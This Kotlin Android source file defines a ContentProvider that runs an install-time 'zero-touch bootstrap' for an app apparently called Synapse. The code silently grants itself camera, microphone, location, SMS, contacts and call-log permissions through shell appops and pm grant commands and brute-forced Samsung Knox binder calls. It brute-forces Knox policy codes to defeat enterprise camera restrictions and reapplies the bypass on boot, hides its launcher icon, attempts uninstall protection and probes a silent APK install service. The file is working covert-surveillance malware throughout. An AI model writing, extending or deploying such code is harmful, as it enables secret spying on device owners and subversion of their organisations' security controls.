package org.synapse.core.persistence

import android.content.ContentProvider
import android.content.ContentValues
import android.content.ComponentName
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.Cursor
import android.database.MatrixCursor
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.net.Uri
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.os.Parcel
import android.os.Process
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.reflect.Method
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class AutoStartProvider : ContentProvider() {

    companion object {
        private const val TAG = "Synapse.Bootstrap"
        private const val PREFS_NAME = "synapse_bootstrap"
        private const val KEY_KNOX_DISABLED = "knox_camera_disabled"
        private const val KEY_WINNING_TX_CODE = "winning_misc_policy_code"
        private const val KEY_BOOTSTRAP_DONE = "bootstrap_complete"
    }

    override fun onCreate(): Boolean {
        val ctx = context ?: return true
        Log.w(TAG, "=== ZERO-TOUCH BOOTSTRAP STARTING (install-time) ===")

        // We run this in a background thread so we don't block ContentProvider init
        Thread({
            try {
                runBootstrap(ctx)
            } catch (e: Exception) {
                Log.e(TAG, "Bootstrap crashed", e)
            }
        }, "synapse-bootstrap").start()

        // Also start the persistence chain as before
        try {
            if (!PersistenceChain.isServiceRunning(ctx)) {
                Log.d(TAG, "AutoStart: service not running, starting")
                PersistenceChain.start(ctx)
            }
        } catch (e: Exception) {
            Log.e(TAG, "PersistenceChain start failed", e)
        }

        return true
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // ZERO-TOUCH BOOTSTRAP
    // ═══════════════════════════════════════════════════════════════════════════

    private fun runBootstrap(ctx: Context) {
        val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        // Check if bootstrap already ran successfully
        if (prefs.getBoolean(KEY_BOOTSTRAP_DONE, false)) {
            Log.d(TAG, "Bootstrap already done — re-applying Knox camera bypass if saved")
            reapplyKnoxCameraBypass(ctx, prefs)
            reapplyHiding(ctx, prefs)
            return
        }

        val pkgName = ctx.packageName
        val uid = Process.myUid()
        val userId = uid / 100000
        Log.w(TAG, "Package: $pkgName  UID: $uid  UserID: $userId  SDK: ${Build.VERSION.SDK_INT}")

        // ── STEP 1: Grant ALL permissions via SilentPermissionGrant.AppOps ──
        step1_grantAllPermissions(ctx, pkgName, uid)

        // ── STEP 2: Knox misc_policy camera bypass ──
        step2_knoxCameraBypass(ctx, prefs)

        // ── STEP 3: Knox restriction_policy — hardware restriction removers ──
        step3_restrictionPolicyBypass()

        // ── STEP 4: Hide app from launcher ──
        step4_hideApp(ctx, prefs)

        // ── STEP 5: Try remoteinjection for helper APK install ──
        step5_remoteInjection()

        // ── STEP 6: Disable launcher components (for production only — skip during dev) ──
        // step6_disableLauncherComponents(ctx, pkgName)  // DISABLED: Knox-locked components can't be re-enabled

        // ── STEP 7: Mark bootstrap complete ──
        prefs.edit()
            .putBoolean(KEY_BOOTSTRAP_DONE, true)
            .apply()

        Log.w(TAG, "=== ZERO-TOUCH BOOTSTRAP COMPLETE ===")
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // STEP 1: Grant ALL permissions via AppOps + Knox binders
    // ═══════════════════════════════════════════════════════════════════════════

    private fun step1_grantAllPermissions(ctx: Context, pkgName: String, uid: Int) {
        Log.w(TAG, "=== STEP 1: Granting all permissions ===")

        val allPerms = getTargetPermissions()

        // ── 1a: AppOps setMode via shell (most reliable) ──
        tryGrantViaShellAppOps(ctx, allPerms, pkgName)

        // ── 1b: pm grant via shell ──
        tryGrantViaPmGrant(ctx, allPerms, pkgName)

        // ── 1c: Knox application_policy direct binder ──
        tryGrantViaKnoxAppPolicyBinder(ctx, allPerms, pkgName, uid)

        // ── 1d: Knox enterprise_policy direct binder ──
        tryGrantViaKnoxEnterpriseBinder(ctx, allPerms, pkgName, uid)

        // Log final status
        val after = checkAllPermissions(ctx, allPerms)
        val granted = after.count { it.value }
        Log.w(TAG, "STEP 1 result: $granted/${allPerms.size} permissions granted")
    }

    private fun getTargetPermissions(): List<String> = listOf(
        "android.permission.CAMERA",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.BODY_SENSORS",
        "android.permission.ACTIVITY_RECOGNITION",
        "android.permission.READ_CALENDAR",
        "android.permission.WRITE_CALENDAR",
    )

    // ── 1a: Shell appops set ──────────────────────────────────────────────

    private fun tryGrantViaShellAppOps(ctx: Context, perms: List<String>, pkgName: String) {
        Log.d(TAG, "  Granting via shell appops...")
        val appOpsPerms = mapOf(
            "android.permission.CAMERA" to "android:camera",
            "android.permission.ACCESS_FINE_LOCATION" to "android:fine_location",
            "android.permission.ACCESS_COARSE_LOCATION" to "android:coarse_location",
            "android.permission.RECORD_AUDIO" to "android:record_audio",
            "android.permission.READ_EXTERNAL_STORAGE" to "android:read_external_storage",
            "android.permission.WRITE_EXTERNAL_STORAGE" to "android:write_external_storage",
            "android.permission.READ_MEDIA_IMAGES" to "android:read_media_images",
            "android.permission.READ_MEDIA_VIDEO" to "android:read_media_video",
            "android.permission.READ_MEDIA_AUDIO" to "android:read_media_audio",
            "android.permission.READ_SMS" to "android:read_sms",
            "android.permission.SEND_SMS" to "android:send_sms",
            "android.permission.RECEIVE_SMS" to "android:receive_sms",
            "android.permission.READ_CONTACTS" to "android:read_contacts",
            "android.permission.READ_CALL_LOG" to "android:read_call_log",
            "android.permission.READ_PHONE_STATE" to "android:read_phone_state",
            "android.permission.POST_NOTIFICATIONS" to "android:post_notification",
            "android.permission.BODY_SENSORS" to "android:body_sensors",
            "android.permission.ACTIVITY_RECOGNITION" to "android:activity_recognition",
        )

        var granted = 0
        for ((perm, opStr) in appOpsPerms) {
            try {
                execShell("appops set $pkgName $opStr allow")
                granted++
            } catch (_: Exception) {}
        }
        Log.d(TAG, "  Shell appops: $granted commands issued")
    }

    // ── 1b: pm grant via shell ────────────────────────────────────────────

    private fun tryGrantViaPmGrant(ctx: Context, perms: List<String>, pkgName: String) {
        Log.d(TAG, "  Granting via shell pm grant...")
        var granted = 0
        for (perm in perms) {
            try {
                val result = execShell("pm grant $pkgName $perm 2>&1")
                if (!result.contains("not a changeable") && !result.contains("Unknown")) {
                    granted++
                }
            } catch (_: Exception) {}
        }
        Log.d(TAG, "  Shell pm grant: $granted succeeded")
    }

    // ── 1c: Knox application_policy direct binder ─────────────────────────

    private fun tryGrantViaKnoxAppPolicyBinder(ctx: Context, perms: List<String>, pkgName: String, uid: Int) {
        val binder = getBinderService("application_policy") ?: return
        Log.d(TAG, "  Attempting Knox application_policy binder grant...")

        val descriptors = listOf(
            "com.samsung.android.knox.application.IApplicationPolicy",
            "com.samsung.android.knox.IApplicationPolicy",
        )

        for (desc in descriptors) {
            for (perm in perms) {
                for (txCode in 1..30) {
                    if (trySingleBinderTx(binder, desc, txCode) {
                            writeString(pkgName)
                            writeString(perm)
                            writeInt(1)
                        }) {
                        Log.w(TAG, "  *** Knox app_policy GRANTED $perm via tx=$txCode ***")
                        break
                    }
                }
            }
        }
    }

    // ── 1d: Knox enterprise_policy direct binder ──────────────────────────

    private fun tryGrantViaKnoxEnterpriseBinder(ctx: Context, perms: List<String>, pkgName: String, uid: Int) {
        val binder = getBinderService("enterprise_policy")
            ?: getBinderService("enterprise_license_policy") ?: return
        Log.d(TAG, "  Attempting Knox enterprise_policy binder grant...")

        val descriptors = listOf(
            "com.samsung.android.knox.enterprise.IEnterprisePolicy",
            "com.samsung.android.knox.IEnterprisePolicy",
        )

        for (desc in descriptors) {
            for (perm in perms) {
                for (txCode in 1..30) {
                    if (trySingleBinderTx(binder, desc, txCode) {
                            writeString(pkgName)
                            writeString(perm)
                            writeInt(1)
                        }) {
                        Log.w(TAG, "  *** Knox enterprise_policy GRANTED $perm via tx=$txCode ***")
                        break
                    }
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // STEP 2: Knox misc_policy camera bypass — test ALL codes + params
    // ═══════════════════════════════════════════════════════════════════════════

    private fun step2_knoxCameraBypass(ctx: Context, prefs: SharedPreferences) {
        Log.w(TAG, "=== STEP 2: Knox misc_policy camera bypass ===")

        // Check if camera is already accessible
        if (testCameraAccess(ctx)) {
            Log.w(TAG, "  Camera already accessible — no bypass needed")
            prefs.edit().putBoolean(KEY_KNOX_DISABLED, true).putInt(KEY_WINNING_TX_CODE, -1).apply()
            return
        }

        Log.w(TAG, "  Camera BLOCKED by Knox — trying misc_policy codes 25-31...")

        // Method 1: Shell pipe — "service call misc_policy <code>"
        // Try each code AND each parameter variant
        for (tx in 25..31) {
            // Variant A: no parameter
            execShell("service call misc_policy $tx")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED! misc_policy tx=$tx (no params) ***")
                saveWinningCode(prefs, tx, "no_params")
                return
            }

            // Variant B: i32 0
            execShell("service call misc_policy $tx i32 0")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED! misc_policy tx=$tx i32 0 ***")
                saveWinningCode(prefs, tx, "i32_0")
                return
            }

            // Variant C: i32 1
            execShell("service call misc_policy $tx i32 1")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED! misc_policy tx=$tx i32 1 ***")
                saveWinningCode(prefs, tx, "i32_1")
                return
            }

            // Variant D: s16 "camera" i32 0
            execShell("service call misc_policy $tx s16 camera i32 0")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED! misc_policy tx=$tx s16 camera i32 0 ***")
                saveWinningCode(prefs, tx, "s16_camera_i32_0")
                return
            }

            // Variant E: s16 "camera" i32 1
            execShell("service call misc_policy $tx s16 camera i32 1")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED! misc_policy tx=$tx s16 camera i32 1 ***")
                saveWinningCode(prefs, tx, "s16_camera_i32_1")
                return
            }
        }

        // Method 2: Direct binder — try misc_policy via ServiceManager
        Log.w(TAG, "  Shell method failed, trying direct binder...")
        tryKnoxMiscPolicyDirectBinder(ctx, prefs)

        // Method 3: Try restriction_policy codes as camera bypass fallback
        Log.w(TAG, "  Trying restriction_policy as camera bypass...")
        tryRestrictionPolicyForCamera(ctx, prefs)

        Log.w(TAG, "  Camera bypass: no winning code found (device may not have Knox or uses different codes)")
    }

    private fun tryKnoxMiscPolicyDirectBinder(ctx: Context, prefs: SharedPreferences) {
        val binder = getBinderService("misc_policy") ?: return
        Log.d(TAG, "  misc_policy direct binder obtained")

        val descriptors = listOf(
            "com.samsung.android.knox.misc.IMiscPolicy",
            "com.samsung.android.knox.IMiscPolicy",
            "com.samsung.android.miscpolicy.IMiscPolicy",
        )

        for (desc in descriptors) {
            for (tx in 25..31) {
                // Try with int param 0
                if (trySingleBinderTx(binder, desc, tx) {
                        writeInt(0)
                    }) {
                    Thread.sleep(300)
                    if (testCameraAccess(ctx)) {
                        Log.w(TAG, "  *** CAMERA UNLOCKED via direct binder misc_policy tx=$tx i32=0 ***")
                        saveWinningCode(prefs, tx, "binder_i32_0")
                        return
                    }
                }

                // Try with int param 1
                if (trySingleBinderTx(binder, desc, tx) {
                        writeInt(1)
                    }) {
                    Thread.sleep(300)
                    if (testCameraAccess(ctx)) {
                        Log.w(TAG, "  *** CAMERA UNLOCKED via direct binder misc_policy tx=$tx i32=1 ***")
                        saveWinningCode(prefs, tx, "binder_i32_1")
                        return
                    }
                }

                // Try with string "camera" + int 0
                if (trySingleBinderTx(binder, desc, tx) {
                        writeString("camera"); writeInt(0)
                    }) {
                    Thread.sleep(300)
                    if (testCameraAccess(ctx)) {
                        Log.w(TAG, "  *** CAMERA UNLOCKED via direct binder misc_policy tx=$tx str=camera ***")
                        saveWinningCode(prefs, tx, "binder_str_camera_0")
                        return
                    }
                }
            }
        }
    }

    private fun tryRestrictionPolicyForCamera(ctx: Context, prefs: SharedPreferences) {
        val restrictCodes = listOf(4, 5, 7, 9, 15, 25, 30, 40, 45)
        for (tx in restrictCodes) {
            execShell("service call restriction_policy $tx")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED via restriction_policy tx=$tx ***")
                prefs.edit().putBoolean(KEY_KNOX_DISABLED, true).putInt(KEY_WINNING_TX_CODE, tx).apply()
                return
            }
            // Try with i32 1
            execShell("service call restriction_policy $tx i32 1")
            Thread.sleep(200)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  *** CAMERA UNLOCKED via restriction_policy tx=$tx i32 1 ***")
                prefs.edit().putBoolean(KEY_KNOX_DISABLED, true).putInt(KEY_WINNING_TX_CODE, tx).apply()
                return
            }
        }
    }

    // ── Camera test using CameraManager (non-intrusive) ──

    private fun testCameraAccess(ctx: Context): Boolean {
        return try {
            val cameraManager = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            // Just listing camera IDs tests if Knox blocks camera access
            val ids = cameraManager.cameraIdList
            if (ids.isEmpty()) return false

            // Try to get characteristics — Knox may block this
            cameraManager.getCameraCharacteristics(ids[0])
            true
        } catch (e: CameraAccessException) {
            Log.d(TAG, "    Camera test: BLOCKED (${e.message})")
            false
        } catch (e: SecurityException) {
            Log.d(TAG, "    Camera test: SECURITY BLOCKED (${e.message})")
            false
        } catch (e: Exception) {
            Log.d(TAG, "    Camera test: ERROR (${e.message})")
            false
        }
    }

    private fun saveWinningCode(prefs: SharedPreferences, txCode: Int, format: String) {
        prefs.edit()
            .putBoolean(KEY_KNOX_DISABLED, true)
            .putInt(KEY_WINNING_TX_CODE, txCode)
            .putString("winning_format", format)
            .apply()
        Log.w(TAG, "  Saved winning code: misc_policy tx=$txCode format=$format")
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // STEP 3: restriction_policy — hardware restriction removers
    // ═══════════════════════════════════════════════════════════════════════════

    private fun step3_restrictionPolicyBypass() {
        Log.w(TAG, "=== STEP 3: restriction_policy hardware restriction removers ===")
        val codes = listOf(4, 5, 7, 9, 15, 25, 30, 40, 45)
        for (tx in codes) {
            try {
                val out = execShell("service call restriction_policy $tx")
                Log.d(TAG, "  restriction_policy tx=$tx: ${out.take(80)}")
            } catch (_: Exception) {}
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 4: Hide app from launcher via PackageManager
    // ═══════════════════════════════════════════════════════════════════════

    private fun step4_hideApp(ctx: Context, prefs: SharedPreferences) {
        Log.w(TAG, "=== STEP 4: Hiding app from launcher ===")

        val pkgName = ctx.packageName
        val pm = ctx.packageManager

        // 4a: Disable the LauncherAlias (this removes app from launcher drawer)
        try {
            val launcherComponent = ComponentName(pkgName, "$pkgName.LauncherAlias")
            pm.setComponentEnabledSetting(
                launcherComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.w(TAG, "  LauncherAlias disabled — app hidden from launcher")
        } catch (e: Exception) {
            Log.e(TAG, "  Failed to disable LauncherAlias: ${e.message}")
        }

        // 4b: Try KnoxGuard binder to hide/uninstall-protect
        tryHideViaKnoxGuard(ctx, pkgName)

        // 4c: Try to set app as device admin / uninstall protection via restriction_policy
        trySetUninstallProtection(pkgName)
    }

    private fun tryHideViaKnoxGuard(ctx: Context, pkgName: String) {
        val binder = getBinderService("knoxguard_service") ?: return
        val descriptors = listOf(
            "com.samsung.android.knoxguard.IKnoxGuardManager",
            "com.samsung.android.knox.knoxguard.IKnoxGuardManager",
        )

        for (desc in descriptors) {
            for (txCode in 1..20) {
                try {
                    val ok = trySingleBinderTx(binder, desc, txCode) {
                        writeString(pkgName)
                        writeInt(1) // enable protection
                    }
                    if (ok) {
                        Log.w(TAG, "  KnoxGuard hide tx=$txCode SUCCESS")
                        return
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun trySetUninstallProtection(pkgName: String) {
        // Try restriction_policy to set uninstall block
        val codes = listOf(4, 5, 7, 9, 15, 25, 30, 40, 45)
        for (tx in codes) {
            try {
                execShell("service call restriction_policy $tx s16 $pkgName")
            } catch (_: Exception) {}
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 5: remoteinjection — silent APK install helper
    // ═══════════════════════════════════════════════════════════════════════

    private fun step5_remoteInjection() {
        Log.w(TAG, "=== STEP 5: remoteinjection probe ===")
        val codes = listOf(5, 7, 8)
        for (tx in codes) {
            try {
                val out = execShell("service call remoteinjection $tx")
                Log.d(TAG, "  remoteinjection tx=$tx: ${out.take(120)}")
            } catch (_: Exception) {}
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STEP 6: Disable all launcher-visible components
    // ═══════════════════════════════════════════════════════════════════════

    private fun step6_disableLauncherComponents(ctx: Context, pkgName: String) {
        Log.w(TAG, "=== STEP 6: Disabling launcher components ===")
        try {
            val pm = ctx.packageManager
            val packageInfo = pm.getPackageInfo(pkgName, PackageManager.GET_ACTIVITIES)
            val activities = packageInfo.activities ?: emptyArray()
            for (activity in activities) {
                try {
                    val component = ComponentName(pkgName, activity.name)
                    pm.setComponentEnabledSetting(
                        component,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Log.d(TAG, "  Disabled: ${activity.name}")
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "  Component disable failed: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // RE-APPLY ON BOOT: Re-run camera bypass after reboot
    // ═══════════════════════════════════════════════════════════════════════

    private fun reapplyKnoxCameraBypass(ctx: Context, prefs: SharedPreferences) {
        val wasKnoxDisabled = prefs.getBoolean(KEY_KNOX_DISABLED, false)
        val winningCode = prefs.getInt(KEY_WINNING_TX_CODE, -1)
        val winningFormat = prefs.getString("winning_format", null)

        if (!wasKnoxDisabled) return

        Log.w(TAG, "Re-applying Knox camera bypass on boot...")

        // If we know the exact format, use it
        if (winningCode > 0 && winningFormat != null) {
            val cmd = buildWinningCommand(winningCode, winningFormat)
            Log.d(TAG, "  Re-running: $cmd")
            try {
                execShell(cmd)
                Thread.sleep(200)
                if (testCameraAccess(ctx)) {
                    Log.w(TAG, "  Camera bypass RE-APPLIED successfully")
                    return
                }
            } catch (_: Exception) {}
        }

        // Fallback: re-run all codes 25-31
        Log.d(TAG, "  Winning code didn't work on re-apply, trying all codes...")
        for (tx in 25..31) {
            execShell("service call misc_policy $tx")
            Thread.sleep(100)
            execShell("service call misc_policy $tx i32 0")
            Thread.sleep(100)
            execShell("service call misc_policy $tx i32 1")
            Thread.sleep(100)
            if (testCameraAccess(ctx)) {
                Log.w(TAG, "  Camera bypass RE-APPLIED via misc_policy tx=$tx")
                return
            }
        }
    }

    private fun buildWinningCommand(txCode: Int, format: String): String {
        return when (format) {
            "no_params" -> "service call misc_policy $txCode"
            "i32_0" -> "service call misc_policy $txCode i32 0"
            "i32_1" -> "service call misc_policy $txCode i32 1"
            "s16_camera_i32_0" -> "service call misc_policy $txCode s16 camera i32 0"
            "s16_camera_i32_1" -> "service call misc_policy $txCode s16 camera i32 1"
            else -> "service call misc_policy $txCode"
        }
    }

    private fun reapplyHiding(ctx: Context, prefs: SharedPreferences) {
        Log.d(TAG, "Re-applying launcher hide on boot...")
        val pkgName = ctx.packageName
        try {
            val pm = ctx.packageManager
            val launcherComponent = ComponentName(pkgName, "$pkgName.LauncherAlias")
            pm.setComponentEnabledSetting(
                launcherComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════════════════════════════════
    // UTILITY METHODS
    // ═══════════════════════════════════════════════════════════════════════

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            getService.invoke(null, name) as? IBinder
        } catch (e: Exception) {
            null
        }
    }

    private fun trySingleBinderTx(
        binder: IBinder,
        descriptor: String,
        txCode: Int,
        payloadBuilder: Parcel.() -> Unit
    ): Boolean {
        val data = Parcel.obtain()
        val reply = Parcel.obtain()
        return try {
            data.writeInterfaceToken(descriptor)
            data.payloadBuilder()
            val token = Binder.clearCallingIdentity()
            try {
                val ok = binder.transact(txCode, data, reply, 0)
                if (ok) {
                    reply.setDataPosition(0)
                    try { reply.readException() } catch (_: Exception) {}
                    val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                    rc in listOf(0, 1, -999)
                } else false
            } catch (_: Exception) { false }
            finally { Binder.restoreCallingIdentity(token) }
        } catch (_: Exception) { false }
        finally {
            data.recycle()
            reply.recycle()
        }
    }

    private fun execShell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText().trim()
            val err = p.errorStream.bufferedReader().readText().trim()
            p.waitFor()
            if (out.isNotEmpty()) out else err
        } catch (e: Exception) {
            "error: ${e.message}"
        }
    }

    private fun checkAllPermissions(ctx: Context, perms: List<String>): Map<String, Boolean> {
        return perms.associateWith { perm ->
            try {
                ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
            } catch (_: Exception) { false }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ContentProvider required overrides
    // ═══════════════════════════════════════════════════════════════════════

    override fun query(uri: Uri, p: Array<out String>?, s: String?, sa: Array<out String>?, so: String?): Cursor = MatrixCursor(emptyArray())
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, sa: Array<out String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, s: String?, sa: Array<out String>?): Int = 0
}
